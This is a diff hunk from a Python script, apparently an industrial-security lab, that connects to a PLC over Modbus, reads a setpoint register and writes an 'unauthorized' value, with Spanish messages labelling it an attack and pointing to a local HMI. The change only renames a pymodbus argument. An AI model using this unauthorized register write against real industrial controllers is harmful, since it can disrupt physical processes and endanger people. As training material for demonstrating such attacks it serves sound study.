@@ -48,16 +48,16 @@ def main() -> None:
         print(f"[!] No se pudo conectar a {args.host}:{args.port}")
         return
 
-    antes = client.read_holding_registers(address=REG_SETPOINT, count=1, slave=args.unit_id)
+    antes = client.read_holding_registers(address=REG_SETPOINT, count=1, device_id=args.unit_id)
     print(f"[*] Setpoint antes del ataque: {antes.registers[0] / 10:.1f} %")
 
     print(f"[*] Escribiendo setpoint no autorizado: {args.valor / 10:.1f} % ...")
-    resp = client.write_register(address=REG_SETPOINT, value=args.valor, slave=args.unit_id)
+    resp = client.write_register(address=REG_SETPOINT, value=args.valor, device_id=args.unit_id)
 
     if resp.isError():
         print("[!] La escritura fallo (revisa si el conducto esta segmentado/bloqueado).")
     else:
-        despues = client.read_holding_registers(address=REG_SETPOINT, count=1, slave=args.unit_id)
+        despues = client.read_holding_registers(address=REG_SETPOINT, count=1, device_id=args.unit_id)
         print(f"[+] Escritura aceptada. Setpoint ahora: {despues.registers[0] / 10:.1f} %")
         print(
             "[+] Observa el HMI (http://localhost:5000): el PLC perseguira "
